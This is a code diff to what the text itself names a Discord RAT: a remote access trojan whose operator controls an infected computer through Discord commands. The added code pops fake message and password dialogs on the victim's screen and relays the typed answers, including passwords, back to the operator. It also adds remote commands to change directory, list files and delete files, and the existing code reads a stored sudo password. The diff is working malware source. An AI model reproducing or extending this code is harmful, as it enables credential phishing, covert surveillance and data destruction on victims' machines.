@@ -9,8 +9,6 @@ import socket
 import pyperclip
 import asyncio
 import pyautogui
-import subprocess
-
 
 load_dotenv()
 
@@ -27,6 +25,8 @@ class MyBot(commands.Bot):
         await self.add_cog(keyboard_cog(bot))
         await self.add_cog(shell_cog(bot))
         await self.add_cog(sudo_cog(bot))
+        await self.add_cog(message_cog(bot))
+
 
 bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)
 
@@ -61,11 +61,125 @@ def get_sudo_password():
     file = open(path + "passwd", "r")
     return file.read()
 
+    
+async def confirm_action(ctx, action_description):
+    message = await ctx.send(f"Are you sure you want to {action_description}")
+
+    await message.add_reaction('✅')
+
+    def check(reaction, user):
+        return user == ctx.author and str(reaction.emoji) == '✅' and reaction.message == message
+
+    try:
+        reaction, user = await bot.wait_for('reaction_add', timeout=60, check=check)
+
+    except asyncio.TimeoutError:
+        await ctx.send("Confirmation timed out. Action canceled.")
+        return False
+
+    else:
+        return True
+
 @bot.command(name="help")
 async def help(ctx):
     help_menu_request = get("https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/help_menu.md")
     help_menu = help_menu_request.content.decode("utf-8")
     embed = embed_data(title="Help menu", description=help_menu)
+    await ctx.send(embed=embed)
+
+
+# Message functions
+
+class message_cog(commands.Cog):
+    def __init__(self, bot):
+        self.bot = bot
+
+    async def alert(self, title, message):
+        pyautogui.alert(text=message, title=title, button="OK")
+
+    async def prompt(self, title, message):
+        user_input = pyautogui.prompt(text=message, title=title , default='')
+        return user_input
+
+    async def password(self, title, message):
+        password = pyautogui.password(text=message, title=title, default='', mask='*')
+        return password
+
+    def cancelled_prompt(self):
+        embed = embed_data(title="Message prompt", description="Prompt was cancelled or no input was entered", color=discord.Color.red())
+        return embed
+
+    @commands.group(name="message", invoke_without_command=True)
+    async def message(self, ctx, title, *args):
+        message = ' '.join(args)
+        await self.alert(title, message)
+        embed = embed_data(title="Message", description="User exited message box with message:", data=message)
+        await ctx.send(embed=embed)
+        
+    @message.command(name="prompt")
+    async def message_prompt(self, ctx, title, *args):
+        message = ' '.join(args)
+        user_input = await self.prompt(title, message)
+        if user_input == None:
+            embed = self.cancelled_prompt()
+        else:
+            embed = embed_data(title="Message Prompt", description="User answer from prompt:", data=user_input)
+        await ctx.send(embed=embed)
+
+    @message.command(name="password")
+    async def message_password(self, ctx, title, *args):
+        message = ' '.join(args)
+        password = await self.prompt(title, message)
+        if password == None:
+            embed = self.cancelled_prompt()
+        else:
+            embed = embed_data(title="Password Prompt", description="User answer from password prompt:", data=password)
+        await ctx.send(embed=embed)
+
+
+# File functions
+
+@bot.command(name="cd")
+async def change_dir(ctx, *args):
+    path = ' '.join(args)
+    embed_title = "Change Directory"
+
+    try:
+        os.chdir(path)
+        embed = embed_data(title=embed_title, description="Changed directory to:", data=path)
+    except FileNotFoundError:
+        embed = embed_data(title=embed_title, description="Could not find directory:", data=path, color=discord.Color.red())
+    except Exception as e:
+        embed = embed_data(title=embed_title, description="Error occured, could not change directory:", data=e, color=discord.Color.red())
+
+    await ctx.send(embed=embed)
+
+@bot.command(name="ls")
+async def list_dir(ctx):
+    current_directory = os.getcwd()
+    items = os.listdir(current_directory)
+    items = '\n'.join(items)
+    
+    embed = embed_data(title="List files", description=f"Files in directory `{current_directory}`:", data=items)
+    await ctx.send(embed=embed)
+
+@bot.command(name="delete")
+async def delete_file(ctx, *args):
+    path = ' '.join(args)
+    embed_title = "Delete File"
+    confirm = await confirm_action(ctx, f"delete `{path}`? This action can not be undone.")
+
+    if confirm:
+        try:
+            os.remove(path)
+            embed = embed_data(title=embed_title, description="Deleted file:", data=path)
+        except FileNotFoundError:
+            embed = embed_data(title=embed_title, description="Could not find file:", data=path, color=discord.Color.red())
+        except Exception as e:
+            embed = embed_data(title=embed_title, description="Error occured, could not delete file:", data=e, color=discord.Color.red())
+        
+    else:
+        embed = embed_data(title=embed_title, description="Action was not confirmed, file not deleted", color=discord.Color.red())
     await ctx.send(embed=embed)
 
 
@@ -559,17 +673,14 @@ done
 
         @sudo.command(name="remove")
         async def remove(self, ctx):
-            def check(reaction, user):  # Our check for the reaction
-                return user == ctx.message.author  # We check that only the authors reaction counts
-
-            message = await ctx.send("Please react to the message!")
-            await message.add_reaction(":heart:")
-
-            reaction = await bot.wait_for("reaction_add", check=check)
-            await ctx.send(f"You reacted with: {reaction[0]}")  # With [0] we only display the emoji
-                        
-
-    
+            password = await self.get_sudo(ctx)
+            if password != 1:
+                confirmation = await confirm_action(ctx, "remove sudo password? This will remove the ability to use functions that require sudo")
+                print(confirmation)
+                if confirmation:
+                    print("delete")
+                else:
+                    print("DONT")
 
 
 # Running the bot
